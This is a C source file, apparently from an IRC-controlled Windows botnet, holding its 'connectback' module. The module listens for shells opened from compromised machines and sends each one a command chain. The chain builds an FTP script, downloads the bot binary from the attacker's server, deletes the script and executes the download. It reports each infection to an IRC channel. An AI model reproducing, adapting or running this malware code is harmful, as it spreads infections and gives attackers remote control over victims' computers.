#include "includes.h"
#include "functions.h"
#include "externs.h"
#ifndef NO_CONNBACK

int connectback_shells = 0;
int connbackport = brandom(1024,65534);

DWORD WINAPI ShellListen(LPVOID param) {
	CONNBACK connback = *((CONNBACK *)param);
	CONNBACK *connbacks = (CONNBACK *)param;
	connbacks->gotinfo=TRUE;

	char buffer[IRCLINE];
	SOCKET sSock, cSock;
	SOCKADDR_IN ssin,csin;
	BOOL success=FALSE;

	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family = AF_INET; 
	ssin.sin_port = fhtons((unsigned short)connback.port); 
	ssin.sin_addr.s_addr = INADDR_ANY; 

	if ((sSock=fsocket(AF_INET,SOCK_STREAM,0)) == INVALID_SOCKET) {
		sprintf(buffer,"-\x03\x34\2connectback\2\x03- Error: socket() failed, returned: <%d>.", fWSAGetLastError());
		if (!connback.silent) irc_privmsg(connback.sock,connback.chan,buffer,connback.notice);
		addlog(buffer);

		clearthread(connback.threadnum);

		ExitThread(0);
	}

	threads[connback.threadnum].sock=sSock;

	if((fbind(sSock, (LPSOCKADDR)&ssin, sizeof(ssin))) == SOCKET_ERROR) {
		int iLastErr=fWSAGetLastError();
		if (iLastErr != 10048) {
			sprintf(buffer,"-\x03\x34\2connectback\2\x03- Error: bind() failed, returned: <%d>.", iLastErr);
			if (!connback.silent) irc_privmsg(connback.sock,connback.chan,buffer,connback.notice);
			addlog(buffer);
			clearthread(connback.threadnum);
			ExitThread(0);
		} else {
			ssin.sin_port=connbackport = brandom(1024,65534);
			if((fbind(sSock, (LPSOCKADDR)&ssin, sizeof(ssin))) == SOCKET_ERROR) {
				int iLastErr=fWSAGetLastError();
				sprintf(buffer,"-\x03\x34\2connectback\2\x03- Error: bind() failed, returned: <%d>.", iLastErr);
				if (!connback.silent && iLastErr!=10048) irc_privmsg(connback.sock,connback.chan,buffer,connback.notice);
				addlog(buffer);
				clearthread(connback.threadnum);
				ExitThread(0);
			}
		}
	}
	
	if (flisten(sSock,5) != SOCKET_ERROR) {

		int csin_len = sizeof(csin);

		while (1) {
			if ((cSock = faccept(sSock,(LPSOCKADDR)&csin,&csin_len)) == INVALID_SOCKET)
				continue;

			sprintf(buffer, "-\x03\x34\2connectback\2\x03- Client connection from IP: %s:%d.", finet_ntoa(csin.sin_addr), csin.sin_port);
			if (!connback.silent) irc_privmsg(connback.sock,connback.chan,buffer,connback.notice);
			addlog(buffer);

			if (frecv(cSock,buffer,sizeof(buffer),0) != SOCKET_ERROR) {
				char cmd_buff[1024];
			//	#ifndef NO_TFTP
			//	_snprintf(cmd_buff, sizeof (cmd_buff),
			//		"tftp -i %s get %s&%s&exit\r\n",
			//		connback.myip,filename,filename);	
			//	#else
				_snprintf(cmd_buff, sizeof (cmd_buff),
		"echo open %s %d >> o&echo user 1 >>o &echo 1 >>o &echo get %s >>o &echo bye >>o &ftp -n -s:o &del /F /Q o &%s\r\n",
		GetIP(connback.sock),ftpport, filename, filename);
			//	#endif
				if (fsend(cSock, cmd_buff, strlen(cmd_buff),0) != SOCKET_ERROR)
					connectback_shells++;
			}
		}
	}

	fclosesocket(sSock);
	clearthread(connback.threadnum);

	ExitThread(0); 
}
#endif